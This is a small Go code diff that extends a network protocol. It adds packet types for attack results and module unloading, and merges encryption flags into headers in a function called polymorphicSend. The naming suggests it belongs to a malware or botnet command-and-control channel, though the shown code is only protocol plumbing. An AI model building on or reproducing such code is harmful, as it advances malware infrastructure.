@@ -26,11 +26,20 @@ const (
 	PktTypeModule     = 5
 	PktTypeModuleDone = 6
 	PktTypeModuleList = 7
+	PktTypeVersionWarn = 8
+	PktTypeAttackResult = 9
+	PktTypeModuleUnload = 10
 
 	UpdateChunkSize = 4096
 
 	AckOK   = 0x01
 	AckFail = 0x00
+
+	ProtoVer     = 1
+	BitmEncrypt  = 1 << 4
+	BitmCompress = 1 << 5
+
+	BitmDefault = ProtoVer | BitmEncrypt
 )
 
 type HandshakeCtx struct {
@@ -218,10 +227,10 @@ func polymorphicSend(conn net.Conn, ctx *HandshakeCtx, pktType uint8, bitmap uin
 	payloadLen := len(payload)
 	totalLen := 4 + payloadLen
 
-	// build header
+	// build header: merge caller flags with protocol defaults
 	hdr := make([]byte, 4)
 	hdr[0] = pktType
-	hdr[1] = bitmap
+	hdr[1] = bitmap | BitmDefault
 	binary.BigEndian.PutUint16(hdr[2:], uint16(payloadLen))
 
 	// encrypt header
